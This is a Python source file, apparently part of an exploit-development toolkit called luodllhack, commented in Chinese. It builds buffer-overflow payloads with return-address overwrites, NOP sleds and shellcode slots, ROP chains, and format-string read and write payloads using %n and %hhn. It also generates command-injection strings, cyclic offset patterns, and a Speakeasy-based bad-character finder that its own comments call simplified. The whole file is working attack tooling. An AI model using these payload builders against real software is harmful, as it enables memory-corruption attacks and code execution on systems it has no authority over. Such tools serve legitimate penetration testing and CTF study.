# -*- coding: utf-8 -*-
"""
luodllhack/exploit/payload.py - Payload 构造模块

根据约束条件构造精确的漏洞利用 Payload:
- 缓冲区溢出 Payload
- 格式化字符串 Payload
- ROP Chain 构造
- Shellcode 包装
- 模式生成和偏移定位
- 坏字符检测
"""

from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from enum import Enum, auto
import struct
import logging

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Payload 类型"""
    BUFFER_OVERFLOW = auto()
    FORMAT_STRING_READ = auto()
    FORMAT_STRING_WRITE = auto()
    ROP_CHAIN = auto()
    SHELLCODE = auto()
    COMMAND = auto()


@dataclass
class Payload:
    """Payload 对象"""
    payload_type: PayloadType
    data: bytes
    description: str
    target_offset: Optional[int] = None
    components: List[str] = field(default_factory=list)

    def __len__(self) -> int:
        return len(self.data)

    def hex(self) -> str:
        return self.data.hex()

    def to_dict(self) -> Dict:
        return {
            'type': self.payload_type.name,
            'size': len(self.data),
            'hex': self.data.hex()[:200],
            'description': self.description,
            'target_offset': self.target_offset,
            'components': self.components
        }


class PayloadBuilder:
    """
    Payload 构造器

    用法:
        builder = PayloadBuilder(arch='x64')

        # 构造缓冲区溢出 payload
        payload = builder.overflow_payload(
            buffer_size=64,
            return_addr=0x7fff12345678
        )

        # 构造格式化字符串 payload
        payload = builder.format_write_payload(
            target_addr=0x7fff00001000,
            value=0x41414141,
            offset=6
        )
    """

    # 常用填充模式
    PATTERNS = {
        'cyclic': b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9',
        'nop_x86': b'\x90',
        'nop_x64': b'\x90',
        'int3': b'\xcc',
    }

    def __init__(self, arch: str = 'x64'):
        self.arch = arch.lower()
        self.ptr_size = 8 if self.arch == 'x64' else 4
        self.pack_fmt = '<Q' if self.arch == 'x64' else '<I'

    def pack_addr(self, addr: int) -> bytes:
        """打包地址"""
        return struct.pack(self.pack_fmt, addr)

    def cyclic_pattern(self, length: int) -> bytes:
        """
        生成循环模式 (用于确定偏移)

        Args:
            length: 长度

        Returns:
            循环模式字节串
        """
        pattern = b''
        chars_upper = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        chars_lower = b'abcdefghijklmnopqrstuvwxyz'
        chars_num = b'0123456789'

        for i in range(length):
            idx = i % 26
            if (i // 26) % 3 == 0:
                pattern += bytes([chars_upper[idx]])
            elif (i // 26) % 3 == 1:
                pattern += bytes([chars_lower[idx]])
            else:
                pattern += bytes([chars_num[idx % 10]])

        return pattern[:length]

    def find_offset(self, pattern: bytes, value: int) -> Optional[int]:
        """
        在循环模式中查找偏移

        Args:
            pattern: 循环模式
            value: 要查找的值

        Returns:
            偏移位置或 None
        """
        search_bytes = struct.pack(self.pack_fmt, value)
        pos = pattern.find(search_bytes)
        return pos if pos >= 0 else None

    def overflow_payload(self, buffer_size: int,
                          return_addr: int = 0x4141414141414141,
                          padding: bytes = b'A',
                          nop_sled: int = 0,
                          shellcode: bytes = b'') -> Payload:
        """
        构造缓冲区溢出 Payload

        Args:
            buffer_size: 缓冲区大小
            return_addr: 目标返回地址
            padding: 填充字节
            nop_sled: NOP 滑板大小
            shellcode: Shellcode

        Returns:
            Payload 对象
        """
        components = []

        # 填充到缓冲区
        data = padding * buffer_size
        components.append(f"Buffer fill: {buffer_size} bytes")

        # 覆盖 saved rbp/ebp (如果需要)
        data += padding * self.ptr_size
        components.append(f"Saved frame pointer: {self.ptr_size} bytes")

        # 返回地址
        data += self.pack_addr(return_addr)
        components.append(f"Return address: 0x{return_addr:x}")

        # NOP 滑板
        if nop_sled > 0:
            data += b'\x90' * nop_sled
            components.append(f"NOP sled: {nop_sled} bytes")

        # Shellcode
        if shellcode:
            data += shellcode
            components.append(f"Shellcode: {len(shellcode)} bytes")

        return Payload(
            payload_type=PayloadType.BUFFER_OVERFLOW,
            data=data,
            description=f"Overflow {buffer_size} byte buffer, return to 0x{return_addr:x}",
            target_offset=buffer_size + self.ptr_size,
            components=components
        )

    def rop_payload(self, buffer_size: int,
                     gadgets: List[int],
                     args: List[int] = None) -> Payload:
        """
        构造 ROP Chain Payload

        Args:
            buffer_size: 缓冲区大小
            gadgets: Gadget 地址列表
            args: 参数列表

        Returns:
            Payload 对象
        """
        components = []

        # 填充
        data = b'A' * buffer_size
        data += b'B' * self.ptr_size  # saved rbp
        components.append(f"Padding: {buffer_size + self.ptr_size} bytes")

        # ROP chain
        for i, gadget in enumerate(gadgets):
            data += self.pack_addr(gadget)
            components.append(f"Gadget {i}: 0x{gadget:x}")

        # 参数
        if args:
            for i, arg in enumerate(args):
                data += self.pack_addr(arg)
                components.append(f"Arg {i}: 0x{arg:x}")

        return Payload(
            payload_type=PayloadType.ROP_CHAIN,
            data=data,
            description=f"ROP chain with {len(gadgets)} gadgets",
            target_offset=buffer_size + self.ptr_size,
            components=components
        )

    def format_read_payload(self, offset: int, count: int = 8) -> Payload:
        """
        构造格式化字符串读取 Payload

        Args:
            offset: 栈偏移
            count: 读取数量

        Returns:
            Payload 对象
        """
        components = []
        data = b''

        for i in range(count):
            data += f'%{offset + i}$p.'.encode()
            components.append(f"Read offset {offset + i}")

        return Payload(
            payload_type=PayloadType.FORMAT_STRING_READ,
            data=data,
            description=f"Format string read from offset {offset}",
            components=components
        )

    def format_write_payload(self, target_addr: int, value: int,
                              offset: int = 6, is_64bit: bool = True) -> Payload:
        """
        构造格式化字符串写入 Payload

        Args:
            target_addr: 目标地址
            value: 要写入的值
            offset: 栈偏移
            is_64bit: 是否 64 位

        Returns:
            Payload 对象
        """
        components = []

        # 简化版: 一次性写入 (仅适用于小值)
        # 实际利用需要分字节写入

        if is_64bit:
            addr_bytes = struct.pack('<Q', target_addr)
        else:
            addr_bytes = struct.pack('<I', target_addr)

        components.append(f"Target: 0x{target_addr:x}")
        components.append(f"Value: 0x{value:x}")

        # 构造 payload: [addr][padding][%Nc%offset$n]
        data = addr_bytes

        # 计算需要输出的字符数
        chars_needed = value - len(addr_bytes)
        if chars_needed > 0:
            fmt = f'%{chars_needed}c%{offset}$n'.encode()
        else:
            fmt = f'%{offset}$n'.encode()

        data += fmt
        components.append(f"Format: {fmt.decode()}")

        return Payload(
            payload_type=PayloadType.FORMAT_STRING_WRITE,
            data=data,
            description=f"Format string write 0x{value:x} to 0x{target_addr:x}",
            target_offset=offset,
            components=components
        )

    def format_write_payload_precise(self, target_addr: int, value: int,
                                      offset: int = 6) -> Payload:
        """
        构造精确的格式化字符串写入 Payload (逐字节写入)

        Args:
            target_addr: 目标地址
            value: 要写入的值 (32 位)
            offset: 初始栈偏移

        Returns:
            Payload 对象
        """
        components = []

        # 分解为 4 个字节
        bytes_to_write = [
            (value >> 0) & 0xFF,
            (value >> 8) & 0xFF,
            (value >> 16) & 0xFF,
            (value >> 24) & 0xFF,
        ]

        # 地址部分 (4 个地址)
        addrs = b''
        for i in range(4):
            addrs += struct.pack('<Q', target_addr + i)
        components.append(f"Addresses: 4 x 8 bytes")

        # 格式串部分
        fmt_parts = []
        written = len(addrs)  # 已输出的字节数

        for i, byte_val in enumerate(bytes_to_write):
            # 计算需要输出多少字符
            needed = byte_val - (written % 256)
            if needed <= 0:
                needed += 256

            if needed > 0:
                fmt_parts.append(f'%{needed}c')
            fmt_parts.append(f'%{offset + i}$hhn')

            written += needed
            components.append(f"Write 0x{byte_val:02x} to +{i}")

        fmt_str = ''.join(fmt_parts).encode()
        data = addrs + fmt_str

        return Payload(
            payload_type=PayloadType.FORMAT_STRING_WRITE,
            data=data,
            description=f"Precise format write 0x{value:x} to 0x{target_addr:x}",
            target_offset=offset,
            components=components
        )

    def command_payload(self, command: str,
                         separator: str = ';') -> Payload:
        """
        构造命令注入 Payload

        Args:
            command: 要执行的命令
            separator: 命令分隔符

        Returns:
            Payload 对象
        """
        data = f'{separator} {command}'.encode()

        return Payload(
            payload_type=PayloadType.COMMAND,
            data=data,
            description=f"Command injection: {command}",
            components=[f"Separator: {separator}", f"Command: {command}"]
        )

    def wrap_shellcode(self, shellcode: bytes,
                        prepend_nop: int = 16,
                        append_nop: int = 0) -> bytes:
        """
        包装 Shellcode (添加 NOP 滑板)

        Args:
            shellcode: 原始 shellcode
            prepend_nop: 前置 NOP 数量
            append_nop: 后置 NOP 数量

        Returns:
            包装后的 shellcode
        """
        return (b'\x90' * prepend_nop) + shellcode + (b'\x90' * append_nop)

    def encode_string(self, s: str, encoding: str = 'utf-8',
                       null_terminate: bool = True) -> bytes:
        """
        编码字符串

        Args:
            s: 字符串
            encoding: 编码方式
            null_terminate: 是否添加空终止符

        Returns:
            编码后的字节串
        """
        data = s.encode(encoding)
        if null_terminate:
            data += b'\x00'
        return data

    def align(self, data: bytes, alignment: int = 8,
               pad_byte: int = 0x00) -> bytes:
        """
        对齐数据

        Args:
            data: 数据
            alignment: 对齐边界
            pad_byte: 填充字节

        Returns:
            对齐后的数据
        """
        remainder = len(data) % alignment
        if remainder == 0:
            return data
        padding = alignment - remainder
        return data + bytes([pad_byte] * padding)


class PatternGenerator:
    """
    模式生成器 - 生成唯一模式 (Aa0Aa1Aa2...) 用于EIP控制精确定位

    模式格式: 每个位置使用不同的字符组合，便于精确定位
    例如: Aa0Aa1Aa2...Ba0Ba1Ba2...
    """

    @staticmethod
    def create(length: int) -> bytes:
        """
        生成唯一模式字符串

        Args:
            length: 模式长度

        Returns:
            bytes: 生成的模式
        """
        if length <= 0:
            return b""

        pattern = bytearray()
        chars1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        chars2 = "abcdefghijklmnopqrstuvwxyz"
        chars3 = "0123456789"

        i = 0
        while len(pattern) < length:
            c1 = chars1[(i // (len(chars2) * len(chars3))) % len(chars1)]
            c2 = chars2[(i // len(chars3)) % len(chars2)]
            c3 = chars3[i % len(chars3)]
            pattern.extend(f"{c1}{c2}{c3}".encode())
            i += 1

        return bytes(pattern[:length])

    @staticmethod
    def offset(value: int) -> Optional[int]:
        """
        从EIP值计算精确偏移

        Args:
            value: EIP寄存器的值（例如: 0x31624130）

        Returns:
            int: 精确偏移，如果未找到则返回None
        """
        if value == 0:
            return None

        # 将值转换为字节序列（小端序）
        value_bytes = struct.pack('<I' if value <= 0xFFFFFFFF else '<Q', value)

        # 生成足够长的模式来查找
        max_length = 20000  # 生成足够长的模式
        pattern = PatternGenerator.create(max_length)

        # 在模式中查找字节序列
        pos = pattern.find(value_bytes)
        if pos != -1:
            return pos

        # 尝试大端序
        value_bytes_be = struct.pack('>I' if value <= 0xFFFFFFFF else '>Q', value)
        pos = pattern.find(value_bytes_be)
        if pos != -1:
            return pos

        return None


@dataclass
class BadCharacterResult:
    """坏字符检测结果"""
    detected_bad_chars: List[int]
    safe_chars: List[int]
    total_tested: int
    success: bool
    error: Optional[str] = None


class BadCharFinder:
    """
    坏字符检测器 - 通过Speakeasy模拟检测哪些字节被过滤

    检测原理:
    1. 生成包含所有可能字符的测试载荷
    2. 通过模拟执行观察哪些字符被保留/过滤
    3. 返回检测到的坏字符列表
    """

    def __init__(self):
        # 默认测试范围: 0x00-0xFF，但排除某些特殊字符
        self.default_test_range = list(range(256))
        # 可能需要排除的字符（根据具体情况）
        self.common_bad_chars = [0x00]  # 空字节通常是坏字符

    def detect(self, target_func_addr: int, target_dll_path: str,
               test_range: range = None,
               speakeasy_timeout: int = 60) -> BadCharacterResult:
        """
        检测坏字符

        Args:
            target_func_addr: 目标函数地址
            target_dll_path: 目标DLL路径
            test_range: 测试范围，默认测试0-255
            speakeasy_timeout: Speakeasy模拟超时时间

        Returns:
            BadCharacterResult: 检测结果
        """
        try:
            import speakeasy

            # 设置测试范围
            if test_range is None:
                test_range = range(256)

            test_chars = list(test_range)
            detected_bad_chars = []
            safe_chars = []

            # 创建Speakeasy模拟器
            se = speakeasy.Speakeasy()

            # 加载DLL
            module = se.load_module(str(target_dll_path))

            # 为每个字符创建测试载荷
            for char in test_chars:
                test_payload = b'A' * 100 + bytes([char]) + b'B' * 100

                try:
                    # 模拟执行函数调用
                    # 这里需要根据具体函数签名调整调用方式
                    result = se.call_func(module, target_func_addr, test_payload)

                    # 检查字符是否被过滤或截断
                    # 这里需要根据实际模拟结果来判断
                    # 简化逻辑：如果执行成功且未崩溃，则认为字符是安全的
                    if result is not None:
                        safe_chars.append(char)
                    else:
                        detected_bad_chars.append(char)

                except Exception as e:
                    # 如果执行失败或崩溃，认为是坏字符
                    detected_bad_chars.append(char)

            # 清理资源
            se.exit()

            return BadCharacterResult(
                detected_bad_chars=detected_bad_chars,
                safe_chars=safe_chars,
                total_tested=len(test_chars),
                success=True
            )

        except ImportError:
            return BadCharacterResult(
                detected_bad_chars=[],
                safe_chars=[],
                total_tested=0,
                success=False,
                error="Speakeasy not available"
            )
        except Exception as e:
            return BadCharacterResult(
                detected_bad_chars=[],
                safe_chars=[],
                total_tested=0,
                success=False,
                error=str(e)
            )
